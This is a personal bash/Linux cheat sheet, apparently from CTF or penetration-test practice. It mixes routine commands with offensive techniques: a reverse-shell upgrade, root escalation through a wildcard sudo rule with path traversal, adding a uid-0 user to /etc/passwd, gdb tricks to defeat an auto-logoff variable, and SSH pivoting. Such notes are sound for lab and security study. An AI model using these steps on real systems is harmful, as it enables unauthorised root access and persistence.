__tags: bash linux tech

## ps, only list certain cats

```bash
ps -e -o user,pid,command
```

## ps, forest view to see process children

```bash
ps -ef --forest

```


## login ssh with custom id_rsa

```
ssh -i id_rsa dexter@10.10.10.216
```

## Easy Pretty bash shell after you connect with nc (yes, this still works well!!!)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

- use `stty sane` to revert!!!!
- you can also just use `python3 -c 'import pty;pty.spawn("/bin/bash")'` and this sometimes works for a half complete but prettier shell (better than sh)



## Port Forward and Double Hop with SSH

```
ssh -L 5555:10.10.10.8:3389 -J dog@192.168.1.12 cat@192.168.122.36

```

## Expose Ports using remote forwarding
```
ssh -N -f -R 3000:localhost:3000 -R 8001:localhost:8001 root@10.10.14.40 -p 2222
```

##  **Sudo command** as a specific user (run after a sudo -l)

```
sudo -u onuma tar
```

## **Sudo Commnd** file description

```
User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*


## This means I can run the "nice" command for everything in the "/notes/" dir, however since we use a "*" this can include ".." thus to get root:

sudo /bin/nice /notes/../bin/bash
```

## Add user to passwd file

```
openssl passwd -crypt -salt salty passwordy


    openssl passwd -crypt -salt xx password

prints xxj31ZMTZzkVA. --> Put this in column two of passwd

    openssl passwd -1 -salt xxxxxxxx password

prints $1$xxxxxxxx$UYCIxa628.9qXjpQCjM4a. --> Put this in column two of passwd

    openssl passwd -apr1 -salt xxxxxxxx password

prints $apr1$xxxxxxxx$dxHfLAsjHkDRmG83UXe8K0. 
```

## Add user to passwd file (easier way)

```
openssl passwd evil
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```


## Enumerate for "unique" bins:

```
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
```


## Convert Windows UTF16 files to Linux UTF8

```
echo "windows" | iconv UTF-16LE -t UTF-8

```

## Run less with WINPEAS colors (Bash colors)

```
less -R winpeas.txt
```

## Mount SMB Share to local fs

```
sudo mount -t cifs -o 'username="user", password="password"' //10.10.10.172/Users /mnt/folder
```

## Mount SMB Share for SMB 1.0

```
sudo mount -t cifs -o 'username="admin",password="$weetNess11#",vers=1.0' '//10.11.1.5/C$' /mnt/point/
```

## list kernel modules

```
lsmod
```

## Grep, look for text in files recursivly while ignoring certain file extensions!!!

```
fgrep -nr password --exclude=\*.js *
```

## Disable TMOUT Variable (auto logoff) in Bash if TMOUT is a READ-Only ENV Var

```bash
unset TMOUT > /dev/null 2>&1
if [ $? -ne 0 ]; then
  gdb <<EOF > /dev/null 2>&1
  attach $$
  call unbind_variable("TMOUT")
  detach
  quit
EOF
fi

```

## Bash Best Practice Template

```bash
#!/usr/bin/env bash

set -o errexit
set -o nounset
set -o pipefail
if [[ "${TRACE-0}" == "1" ]]; then
    set -o xtrace
fi

if [[ "${1-}" =~ ^-*h(elp)?$ ]]; then
    echo 'Usage: ./script.sh arg-one arg-two

This is an awesome bash script to make your life better.

'
    exit
fi

cd "$(dirname "$0")"

main() {
    echo do awesome stuff
}

main "$@"

```
